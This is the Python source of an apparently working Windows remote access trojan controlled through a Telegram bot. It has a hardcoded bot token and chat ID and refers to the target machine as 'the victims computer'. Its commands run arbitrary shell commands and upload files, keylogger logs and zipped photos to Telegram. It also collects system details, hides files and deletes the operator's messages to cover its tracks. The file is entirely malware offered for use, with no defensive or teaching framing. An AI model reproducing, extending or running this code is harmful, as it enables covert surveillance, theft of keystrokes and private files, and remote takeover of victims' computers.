import cv2 
import os 
import subprocess 
import requests 
import platform 
import time 
import asyncio
import ctypes
import psutil 
from zipPhotos import zip
from keylogger import start_keylogger
import threading 
from telegram.ext import Application, MessageHandler, ContextTypes, filters, CommandHandler
from telegram import Update
import win32con, win32api


# Declarations 
token = "8294052417:AAG1Kw-KMc2zrRd5lV7pspJu6TxaJgl7QPQ"
chat_id = "7578121050"

# Help 
help = """
Available Commands: 
ls = lists file in the current directory 
sys = system information 
admin = check admin privileges 
donwload <file_path> = downloads a specified file 
photos = zips and gets phots from the Pictures folder
usr = gets the user profile path 
help = displays available commands 
shell = use shell command. Syntax shell <your_command>
hide = hides a file. Syntax hide <file_name>
unhide = unhides a file. Syntax unhide <file_name>
"""


# Hide apps 
def hide(file):
    win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_HIDDEN)
    return f'{file} is hidden'

    
def unhide(file):
    win32api.SetFileAttributes(file, win32con.FILE_ATTRIBUTE_NORMAL)
    return f'{file} is unhidden'


# Gets photos from the photos path and saves it in %temp% you can download it after 
def photos():
    return zip()


# Change directory 
def change_dir(file):
    
    if not os.path.exists(file):
        return f"File does not exist"
    
    else: 
        os.chdir(file)
        return f'Changed directory to {file}'
        
        
    


        
# Admin check 
def is_admin():
    try:
        if ctypes.windll.shell32.IsUserAnAdmin() == 1:
            return True
        else:
            return False
    except:
        return False
    

# Functions syntax: download <file_path> Donwloads the file from the victims computer
def download(file_name):
    
    # Checks if file exists 
    try: 
        file_path = file_name
    
        if not os.path.isfile(file_path):
            return "File does not exist. "
        
        
        url = f"https://api.telegram.org/bot{token}/sendDocument"
        params = {
            "chat_id": chat_id,
            "caption": f"Here is the file: {file_name}"
        }
        
        with open(file_path, "rb") as f:
            data = f.read()
            files = {"document": (file_name, data)}
            response = requests.post(url, params=params, files=files)
        if response.status_code == 200:
            return "File sent successfully."
            
            
        else:
            return f"Failed to send file. Status code: {response.status_code}"
                
                
    
    except FileNotFoundError as e:
        return str(e)
    
    


# Start keylogger (runs and saves the log)
def run_save(duration, name):
    start_keylogger(duration, name)
    
    cwd = os.getcwd()
    file_path = os.path.join(cwd, name)
    
    result = download(file_path)
    if result: 
        os.remove(file_path)
    else:
        os.remove(file_path)
        return "Failed to send keylogger file."


# Gets some simple system info 
def get_system_info():
    
    my_system = platform.uname()
    
    # Monitor res 
    usr = ctypes.windll.user32
    usrscr = usr.GetSystemMetrics(0), usr.GetSystemMetrics(1)
    
    

    sys = {
        "System": my_system.system,
        "Node Name": my_system.node,
        "Release": my_system.release,
        "Version": my_system.version,
        "Machine": my_system.machine,
        "Processor": my_system.processor,
        "Screen Resolution": f"{usrscr[0]}x{usrscr[1]}"
    }
    return sys 






processed_messages = []


# Message deletion by bot, after you send it 
def delete_message(message_id):
    url = f"https://api.telegram.org/bot{token}/deleteMessage"
    params = {"chat_id": chat_id, "message_id": message_id}
    response = requests.get(url, params=params)
    if response.status_code != 200:
        print(f"Failed to delete message. Status code:")
    




# GET UPDATES FUNCTIONS 
def get_updates(offset=None):
    url = f"https://api.telegram.org/bot{token}/getUpdates"
    params = {"offset": offset, "timeout": 60}
    response = requests.get(url, params=params)
    if response.status_code == 200:
        data = response.json()
        return data.get("result", [])
    else:
        print(f"Failed to get updates. Status code: {response.status_code}")
        return []


# command execution 
def command_exe(command):
    try: 
        if command == "ls":
            result = os.listdir(".")
            return "\n".join(result)
        
        elif command == "sys":
            sys = get_system_info()
            result = "\n".join(f"{key}: {value}" for key, value in sys.items())
            return result 
        
        
        # Check admin privileges
        elif command == "admin":
            if is_admin():
                return "The script is running with admin privileges."
            else:
                return "The script is NOT running with admin privileges."
           
        # Download  
        elif command.startswith("download "):
            file_name = command.split(" ", 1)[1]
            return download(file_name)
        
            
        # Zips all the photos from the photos folder
        elif command == "photos":
            photos()
            
            
        # Gets the username from C:\Users
        elif command == "usr":
            user_profile = os.environ['USERPROFILE']
            return user_profile
        
        
        # Help command. Displays all the available commands
        elif command == "help":
            return help
        
        
        # keylogger syntax: keylogger <duration>
        elif command.startswith("keylogger"):
            parts = command.split()

            if len(parts) < 2:
                return "Please specify a duration. Example: keylogger 5"

            try:
                duration = int(parts[1])
            except ValueError:
                return "Duration must be a number."

            name = "log.txt"
            # Run keylogger in a separate thread so the bot can respond immediately
            threading.Thread(target=run_save, args=(duration, name), daemon=True).start()
            return f"Keylogger started for {duration} seconds."
        
        
        # Shell commands syntax: shell <your_command> Better to check the os name before using to type in the good shell command
        elif command.startswith("shell "):
            exe = command.split(" ", 1)[1]

            try:
                result = subprocess.run(
                    exe,
                    shell=True,
                    capture_output=True,
                    text=True
                )
                output = result.stdout if result.stdout else result.stderr
            except Exception as e:
                output = f'Error'
                
            return output
        
        elif command.startswith("cd "):
            name = command.split(" ", 1)[1]
            return change_dir(name)

        elif command.startswith("hide "):
            file = command.split(" ", 1)[1]

            return hide(file)
        
        elif command.startswith("unhide "):
            file = command.split(" ", 1)[1]

            return unhide(file)

        
        
        
    except Exception as e:
        return str(e)
    

# HANDLE UPDATES FUNCTION
def handle_updates(updates):
    highest_update_id = 0
    for update in updates:
        
        
        if "message" in update and "text" in update["message"]:
            message_text = update["message"]["text"]
            message_id = update["message"]["message_id"]
            if message_id in processed_messages:
                continue
            processed_messages.append(message_id)
            delete_message(message_id)
            result = command_exe(message_text)
            if result:
                send_message(result)
            
                
        update_id = update["update_id"]
        if update_id > highest_update_id:
            highest_update_id = update_id
    return highest_update_id

# SEND MESSAGE FUNCTION
def send_message(text):
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    params = {'chat_id': chat_id, 'text': text}
    response = requests.post(url, params=params)
    if response.status_code != 200:
        print("Failed to send message:", response.text)


    

# main function 
def main():
    offset = 0
    while True: 
        updates = get_updates(offset)
        if updates:
            offset = handle_updates(updates) + 1
            processed_messages.clear()
            
        else:
            print("No new updates. ")
            time.sleep(1)

main()
